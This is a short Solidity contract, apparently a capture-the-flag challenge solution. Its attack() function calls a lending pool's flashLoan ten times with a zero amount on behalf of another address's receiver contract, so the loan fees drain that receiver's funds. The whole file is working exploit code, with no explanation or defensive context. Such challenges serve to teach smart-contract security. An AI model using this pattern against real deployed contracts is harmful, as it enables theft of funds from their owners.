// SPDX-License-Identifier: MIT
pragma solidity ^0.8.16;

interface IPool {
    function flashLoan(
        address receiver,
        address token,
        uint256 amount,
        bytes calldata data
    ) external returns (bool);
}

contract Attack2 {
    address private immutable pool;
    address private immutable receiver;
    address private constant ETH = 0xEeeeeEeeeEeEeeEeEeEeeEEEeeeeEeeeeeeeEEeE;

    constructor(address _pool, address _receiver) {
        pool = _pool;
        receiver = _receiver;
    }

    function attack() external {
        for (uint256 i = 0; i < 10; ) {
            IPool(pool).flashLoan(
                receiver,
                ETH,
                0,
                abi.encodeWithSignature(
                    "onFlashLoan(address,address,uint256,uint256,bytes)"
                )
            );
            unchecked {
                ++i;
            }
        }
    }
}
